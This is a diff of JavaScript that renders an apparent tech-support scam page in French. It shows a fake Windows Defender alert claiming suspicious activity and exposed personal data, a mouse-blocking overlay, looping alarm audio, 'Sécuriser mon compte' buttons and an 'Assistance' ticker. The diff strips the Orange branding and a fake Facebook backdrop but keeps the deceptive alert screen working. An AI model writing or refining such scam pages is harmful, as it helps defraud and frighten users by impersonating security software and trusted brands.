@@ -9,7 +9,7 @@
     document.head.appendChild(styleLink);
   }
 
-  document.title = "Fond bleu avec modale";
+  document.title = "Assistance";
 
   mount.innerHTML =
     '<div class="mouse-blocker" id="mouseBlocker" aria-hidden="true"></div>' +
@@ -25,7 +25,7 @@
     '<rect x="11" y="11" width="8" height="8" fill="#ffb900"/>' +
     '</svg></span>' +
     '<h2 class="defender-alert-title">Alerte de sécurité windows Defender</h2></header>' +
-    '<p class="defender-alert-critical">ANOMALIE CRITIQUE DÉTECTÉE</p>' +
+    '<p class="defender-alert-critical">Une erreur a été détectée</p>' +
     '<p class="defender-alert-text">Windows a détecté une activité suspecte sur votre système.</p>' +
     '<p class="defender-alert-text">Vos données personnelles et informations sensibles sont potentiellement exposées.</p>' +
     '<p class="defender-alert-text">* Windows protège actuellement vos données.</p>' +
@@ -43,45 +43,8 @@
     '</section></div></div>' +
     '<div class="home-page">' +
     '<main class="screen">' +
-    '<div class="fb-desktop-bg" aria-hidden="true">' +
-    '<header class="fb-topbar"><div class="fb-topbar-left">' +
-    '<span class="fb-topbar-logo">f</span><div class="fb-search">Rechercher sur Facebook</div></div>' +
-    '<div class="fb-topbar-center">' +
-    '<span class="fb-nav-icon active">⌂</span><span class="fb-nav-icon">👥</span>' +
-    '<span class="fb-nav-icon">📺</span><span class="fb-nav-icon">🏪</span><span class="fb-nav-icon">👤</span></div>' +
-    '<div class="fb-topbar-right">' +
-    '<span class="fb-topbar-pill"></span><span class="fb-topbar-pill"></span><span class="fb-topbar-pill"></span></div></header>' +
-    '<div class="fb-desktop-layout"><aside class="fb-sidebar-left">' +
-    '<div class="fb-side-item"><span class="fb-avatar"></span> Votre profil</div>' +
-    '<div class="fb-side-item"><span class="fb-side-icon">👤</span> Amis</div>' +
-    '<div class="fb-side-item"><span class="fb-side-icon">📰</span> Fil d\'actualité</div>' +
-    '<div class="fb-side-item"><span class="fb-side-icon">👥</span> Groupes</div>' +
-    '<div class="fb-side-item"><span class="fb-side-icon">🏪</span> Marketplace</div>' +
-    '<div class="fb-side-item"><span class="fb-side-icon">📺</span> Watch</div>' +
-    '<div class="fb-side-item"><span class="fb-side-icon">🕓</span> Souvenirs</div>' +
-    '<div class="fb-side-item"><span class="fb-side-icon">🔖</span> Enregistrements</div></aside>' +
-    '<section class="fb-feed"><div class="fb-stories">' +
-    '<div class="fb-story"></div><div class="fb-story"></div><div class="fb-story"></div>' +
-    '<div class="fb-story"></div><div class="fb-story"></div></div>' +
-    '<div class="fb-composer"><span class="fb-avatar"></span><div class="fb-composer-input">Quoi de neuf ?</div></div>' +
-    '<article class="fb-post"><div class="fb-post-head"><span class="fb-avatar sm"></span><div><strong>Marie Dupont</strong><small>Il y a 2 h</small></div></div>' +
-    '<div class="fb-post-text">Belle journée en famille ☀️</div><div class="fb-post-image"></div></article>' +
-    '<article class="fb-post"><div class="fb-post-head"><span class="fb-avatar sm"></span><div><strong>Thomas Martin</strong><small>Il y a 5 h</small></div></div>' +
-    '<div class="fb-post-text">Quelqu\'un a des recommandations pour un bon restaurant ?</div></article></section>' +
-    '<aside class="fb-sidebar-right"><h3>Contacts</h3>' +
-    '<div class="fb-contact"><span class="fb-avatar xs"></span> Sophie Laurent</div>' +
-    '<div class="fb-contact"><span class="fb-avatar xs"></span> Lucas Bernard</div>' +
-    '<div class="fb-contact"><span class="fb-avatar xs"></span> Emma Petit</div>' +
-    '<div class="fb-contact"><span class="fb-avatar xs"></span> Hugo Moreau</div>' +
-    '<div class="fb-contact"><span class="fb-avatar xs"></span> Julie Roux</div>' +
-    '<div class="fb-sponsored"><h3>Sponsorisé</h3><div class="fb-ad"></div><div class="fb-ad"></div></div></aside></div></div>' +
-    '<div class="fb-bg-overlay" aria-hidden="true"></div>' +
-    '<h1 class="warning-text">votre ordinateur est bloque</h1>' +
     '<section class="modal" aria-label="Modale carree">' +
-    '<header class="fb-submodal-header"><div class="orange-logo" aria-hidden="true">' +
-    '<svg viewBox="0 0 110 32" role="img" aria-hidden="true">' +
-    '<text x="0" y="24" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-size="24" font-weight="700">orange</text>' +
-    '</svg></div>' +
+    '<header class="fb-submodal-header">' +
     '<button class="fb-close" id="fbCloseBtn" type="button" aria-label="Fermer">&times;</button></header>' +
     '<div class="fb-submodal-separator" aria-hidden="true"></div><div class="modal-content"><div class="modal-top">' +
     '<div class="warning-icon" aria-hidden="true"><svg viewBox="0 0 64 64" role="img" aria-hidden="true">' +
@@ -98,7 +61,7 @@
     '<div class="modal-bottom"><div class="modal-actions" role="group" aria-label="Actions">' +
     '<button class="modal-btn modal-btn-allow" id="secureAccountBtn" type="button">Sécuriser mon compte</button>' +
     '<button class="modal-btn modal-btn-deny" id="denyAccountBtn" type="button">Ce n\'est pas moi</button></div></div></div></section></main></div>' +
-    '<div class="ticker" aria-label="Bandeau defilant"><p class="ticker-text">Assistance Orange</p></div>' +
+    '<div class="ticker" aria-label="Bandeau defilant"><p class="ticker-text">Assistance</p></div>' +
     '<audio id="securityAudio1" src="script-audio.mp3" loop preload="auto"></audio>' +
     '<audio id="securityAudio2" src="script-audio-2.mp3" loop preload="auto"></audio>';
 
